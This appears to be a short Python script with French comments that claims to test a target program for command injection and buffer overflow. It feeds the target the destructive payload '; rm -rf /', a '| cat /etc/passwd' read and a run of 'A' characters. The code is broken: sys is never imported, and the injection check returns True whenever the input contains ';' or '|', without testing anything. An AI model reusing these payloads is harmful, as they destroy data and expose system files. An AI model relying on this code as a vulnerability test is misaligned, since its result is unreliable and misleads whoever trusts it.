import subprocess

# Vérifie si le programme cible est vulnérable à l'injection de commandes
def check_command_injection(target, input):
    # Exécutez le programme cible en lui passant l'entrée comme argument
    command = [target, input]

    # Vérifiez si l'entrée contient des caractères dangereux
    if ";" in input or "|" in input:
        print("Dangerous input detected !")
        subprocess.call(command)
        return True

    return False

# Vérifie si le programme cible est vulnérable à la surcharge de tampon
def check_buffer_overflow(target, input):
    # Ajoutez des caractères supplémentaires à l'entrée jusqu'à ce qu'elle dépasse la taille maximale du tampon
    buffer = input
    while len(buffer) < 300:
        buffer += "A"

    # Exécutez le programme cible en lui passant l'entrée surchargée en tant qu'argument
    command = [target, buffer]
    subprocess.call(command)

# Récupérez le nom du programme cible à partir des arguments
target = sys.argv[1]

# Exécutez les tests de vulnérabilité sur le programme cible
print("Testing command injection vulnerability...")
check_command_injection(target, "; rm -rf /")
check_command_injection(target, "| cat /etc/passwd")

print("\nTesting buffer overflow vulnerability...\n")
check_buffer_overflow(target, "AAAAAA")